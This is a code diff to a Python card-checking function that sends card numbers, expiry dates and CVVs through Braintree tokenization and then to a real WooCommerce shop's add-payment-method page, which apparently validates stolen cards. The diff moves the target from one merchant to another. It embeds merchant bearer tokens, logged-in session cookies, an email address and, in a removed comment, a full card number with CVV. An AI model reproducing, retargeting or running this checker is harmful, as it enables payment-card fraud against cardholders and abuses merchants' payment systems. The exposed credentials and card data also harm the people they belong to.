@@ -85,14 +85,11 @@ def chk(card):
 
 
 
-
-
-
 	headers = {
     'authority': 'payments.braintree-api.com',
     'accept': '*/*',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
-    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzM5MTkyNDksImp0aSI6IjlhNDgwZjA5LTA4MmItNGY4MS05YmQ5LTUwMjdiNDU0ZjQzNCIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbIm1hbmFnZV92YXVsdCJdLCJzY29wZSI6WyJCcmFpbnRyZWU6VmF1bHQiLCJCcmFpbnRyZWU6QVhPIl0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6InN0dWR5bm90ZXNhYmFsbGNfaW5zdGFudCJ9fQ.aGUOAkRDXNklByNSFaJxareqdh9EAhv9QtZ2obrUQeYEnqLI7D5o5Xpzf8udpuktpUH-dA4rf525LsD_JhJe0Q',
+    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzQxMjc5NDgsImp0aSI6Ijg0ZjQwMDA3LWYyNDEtNGJlYi04ODYwLWE5MzdiOTU3YzEwMiIsInN1YiI6ImY3Y3N3N2Myanhkc254MmYiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImY3Y3N3N2Myanhkc254MmYiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnt9fQ.ekcSncDoV5CWXup2BWw-d_wE0cmrxDoGPrxIz6fXzghLze9P_tOOluUqIbGhcRLZ_SJcY14gsWLDL85HDV9G7Q',
     'braintree-version': '2018-05-10',
     'cache-control': 'no-cache',
     'content-type': 'application/json',
@@ -112,7 +109,7 @@ def chk(card):
     'clientSdkMetadata': {
         'source': 'client',
         'integration': 'custom',
-        'sessionId': '17d27050-7e68-4618-92f2-86c58ea1cb7b',
+        'sessionId': 'e481cc17-1e4b-4378-b8db-906b80aa6029',
     },
     'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
     'variables': {
@@ -122,10 +119,6 @@ def chk(card):
                 'expirationMonth': mm,
                 'expirationYear': yy,
                 'cvv': cvc,
-                'billingAddress': {
-                    'postalCode': '10080',
-                    'streetAddress': 'hhfhfbfv',
-                },
             },
             'options': {
                 'validate': False,
@@ -136,51 +129,35 @@ def chk(card):
 }
 
 	response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
-
-# Note: json_data will not be serialized by requests
-# exactly as it was in the original request.
-#data = '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"17d27050-7e68-4618-92f2-86c58ea1cb7b"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"5597581975224269","expirationMonth":"10","expirationYear":"2028","cvv":"519","billingAddress":{"postalCode":"10080","streetAddress":"hhfhfbfv"}},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}'
-#response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, data=data)
 	tok = response.json()['data']['tokenizeCreditCard']['token']
-#2
-
-
-
-
 
 
 	cookies = {
-    '_ga': 'GA1.1.998389256.1720402750',
-    '_fbp': 'fb.1.1720402754229.108781710779578398',
-    'cookielawinfo-checkbox-necessary': 'yes',
-    'CookieLawInfoConsent': 'eyJuZWNlc3NhcnkiOnRydWV9',
-    'viewed_cookie_policy': 'yes',
-    'mtk_src_trk': '{"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}',
-    'mailchimp_landing_site': 'https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    'wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76': 'bfidjmoh5527vbnm%7C1734946762%7Cq57xPnP5LimFHbVxfM86P5kE7e59YIpaUVAOVA5UIT6%7C2547c543699b5df3b61bd76b52ff7e15ce35a19984f9cfd3dc889acca81f0eaa',
-    'mailchimp_user_previous_email': 'moh5527vbnm%40gmail.com',
-    'mailchimp_user_email': 'moh5527vbnm%40gmail.com',
-    '_ga_WNQMQBX793': 'GS1.1.1733832852.47.0.1733832852.60.0.0',
+    'browser_id': '835f5303-1c91-46f4-87b8-a47492b83d4e',
+    'wordpress_logged_in_6054d9db2853e7d53db2e3118d075b34': 'moh555827vbnm%7C1735251034%7C4ElI0CnI2ZXVfTqrnNyzoRgL7XNQzo2L4lm0V87aGUR%7Cb27b1bd367996487ef2ca0db4763d4b7ad97b4303457e3d40dc656b0935d6a0f',
+    'wfwaf-authcookie-5bc80232d54eac93bb1f0de1a1a02ffa': '54241%7Cother%7Cread%7C3ef1fdff37919c86e23f9678db8483ab210d32942036cd046cb7e86a7353912e',
+    '_ga': 'GA1.1.760568378.1724201436',
+    '_fbp': 'fb.1.1724201437375.423154145703648845',
     'sbjs_migrations': '1418474375998%3D1',
-    'sbjs_current_add': 'fd%3D2024-12-10%2012%3A14%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
-    'sbjs_first_add': 'fd%3D2024-12-10%2012%3A14%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current_add': 'fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
+    'sbjs_first_add': 'fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
     'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
     'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36',
-    'sbjs_session': 'pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F',
-    '_ga_SGEGXEGQDY': 'GS1.1.1733832852.50.0.1733832852.60.0.0',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F',
+    '_ga_1QES5YVWJQ': 'GS1.1.1734041398.9.1.1734041571.0.0.0',
 }
 
 	headers = {
-    'authority': 'www.studynotesaba.com',
+    'authority': 'www.intoxicatedonlife.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
     'cache-control': 'no-cache',
     'content-type': 'application/x-www-form-urlencoded',
-    # 'cookie': '_ga=GA1.1.998389256.1720402750; _fbp=fb.1.1720402754229.108781710779578398; cookielawinfo-checkbox-necessary=yes; CookieLawInfoConsent=eyJuZWNlc3NhcnkiOnRydWV9; viewed_cookie_policy=yes; mtk_src_trk={"type":"typein","utm_campaign":"(none)","utm_source":"(direct)","utm_medium":"(none)","utm_content":"(none)","utm_id":"(none)","utm_term":"(none)","session_pages":"2","session_count":"24"}; mailchimp_landing_site=https%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; wordpress_logged_in_76bec00f9541eed79fabb1ee44a35b76=bfidjmoh5527vbnm%7C1734946762%7Cq57xPnP5LimFHbVxfM86P5kE7e59YIpaUVAOVA5UIT6%7C2547c543699b5df3b61bd76b52ff7e15ce35a19984f9cfd3dc889acca81f0eaa; mailchimp_user_previous_email=moh5527vbnm%40gmail.com; mailchimp_user_email=moh5527vbnm%40gmail.com; _ga_WNQMQBX793=GS1.1.1733832852.47.0.1733832852.60.0.0; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-10%2012%3A14%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_first_add=fd%3D2024-12-10%2012%3A14%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3D%28none%29; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D1%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.studynotesaba.com%2Fmy-account%2Fadd-payment-method%2F; _ga_SGEGXEGQDY=GS1.1.1733832852.50.0.1733832852.60.0.0',
-    'origin': 'https://www.studynotesaba.com',
+    # 'cookie': 'browser_id=835f5303-1c91-46f4-87b8-a47492b83d4e; wordpress_logged_in_6054d9db2853e7d53db2e3118d075b34=moh555827vbnm%7C1735251034%7C4ElI0CnI2ZXVfTqrnNyzoRgL7XNQzo2L4lm0V87aGUR%7Cb27b1bd367996487ef2ca0db4763d4b7ad97b4303457e3d40dc656b0935d6a0f; wfwaf-authcookie-5bc80232d54eac93bb1f0de1a1a02ffa=54241%7Cother%7Cread%7C3ef1fdff37919c86e23f9678db8483ab210d32942036cd046cb7e86a7353912e; _ga=GA1.1.760568378.1724201436; _fbp=fb.1.1724201437375.423154145703648845; sbjs_migrations=1418474375998%3D1; sbjs_current_add=fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; sbjs_first_add=fd%3D2024-12-12%2022%3A10%3A12%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F%7C%7C%7Crf%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; sbjs_current=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_first=typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29; sbjs_udata=vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F124.0.0.0%20Mobile%20Safari%2F537.36; sbjs_session=pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.intoxicatedonlife.com%2Fstore%2Fmy-account%2Fadd-payment-method%2F; _ga_1QES5YVWJQ=GS1.1.1734041398.9.1.1734041571.0.0.0',
+    'origin': 'https://www.intoxicatedonlife.com',
     'pragma': 'no-cache',
-    'referer': 'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'referer': 'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',
     'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
     'sec-ch-ua-mobile': '?1',
     'sec-ch-ua-platform': '"Android"',
@@ -193,24 +170,28 @@ def chk(card):
 }
 
 	data = {
-    'payment_method': 'braintree_cc',
-    'braintree_cc_nonce_key': tok,
-    'braintree_cc_device_data': '{"device_session_id":"929bae7a0378e9a66a02791d3d1b9f8e","fraud_merchant_id":null,"correlation_id":"17d27050-7e68-4618-92f2-86c58ea1"}',
-    'braintree_cc_3ds_nonce_key': '',
-    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/fsqwv5czpsr7wnqc/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/fsqwv5czpsr7wnqc"},"merchantId":"fsqwv5czpsr7wnqc","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"applePayWeb":{"countryCode":"US","currencyCode":"USD","merchantIdentifier":"fsqwv5czpsr7wnqc","supportedNetworks":["visa","mastercard","amex","discover"]},"fastlane":{"enabled":true},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["Discover","JCB","MasterCard","Visa","American Express","UnionPay"]},"threeDSecureEnabled":false,"threeDSecure":null,"androidPay":{"displayName":"Study Notes ABA LLC","enabled":true,"environment":"production","googleAuthorizationFingerprint":"eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MzM5MTkyNTMsImp0aSI6IjRhZjBlNjc5LWM2YjEtNGFlOC1iMzQ2LTI4YmNlYTczYjY5MiIsInN1YiI6ImZzcXd2NWN6cHNyN3ducWMiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImZzcXd2NWN6cHNyN3ducWMiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0Ijp0cnVlfSwicmlnaHRzIjpbInRva2VuaXplX2FuZHJvaWRfcGF5IiwibWFuYWdlX3ZhdWx0Il0sInNjb3BlIjpbIkJyYWludHJlZTpWYXVsdCIsIkJyYWludHJlZTpBWE8iXSwib3B0aW9ucyI6e319.XDf31zOYmyNsURa6S-_7-3NY5SCTV-YI8HxnfcdPlhumK2Pldwt8nCwg60mQgxxCWMfsC7BIacuECYgLNHUH4w","paypalClientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","supportedNetworks":["visa","mastercard","amex","discover"]},"paypalEnabled":true,"paypal":{"displayName":"Study Notes ABA LLC","clientId":"AdK9MKiret3zcVK9VufGNTD9wp47RxRz4Cx_YlrHe0beIfHzkHbwy3naaP0NrI7ZJ-ZNQ7s7c1eEIsbY","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"studynotesaballc_instant","payeeEmail":null,"currencyIsoCode":"USD"}}',
-    'woocommerce-add-payment-method-nonce': '44369db5af',
-    '_wp_http_referer': '/my-account/add-payment-method/',
+    'payment_method': 'braintree_credit_card',
+    'wc-braintree-credit-card-card-type': 'master-card',
+    'wc-braintree-credit-card-3d-secure-enabled': '',
+    'wc-braintree-credit-card-3d-secure-verified': '',
+    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
+    'wc_braintree_credit_card_payment_nonce': tok,
+    'wc_braintree_device_data': '{"correlation_id":"f5a6e374446f26468483ab0cb0ca74e5"}',
+    'wc-braintree-credit-card-tokenize-payment-method': 'true',
+    'woocommerce-add-payment-method-nonce': 'd7b0bfa054',
+    '_wp_http_referer': '/store/my-account/add-payment-method/',
     'woocommerce_add_payment_method': '1',
 }
 
 	response = requests.post(
-    'https://www.studynotesaba.com/my-account/add-payment-method/',
+    'https://www.intoxicatedonlife.com/store/my-account/add-payment-method/',
     cookies=cookies,
     headers=headers,
     data=data,
 )
 	text = response.text
-	pattern = r'Reason: (.*?)\s*</li>'
+	pattern = r'Status code (.*?)\s*</li>'
+
 	
 	
 	match = re.search(pattern, text)
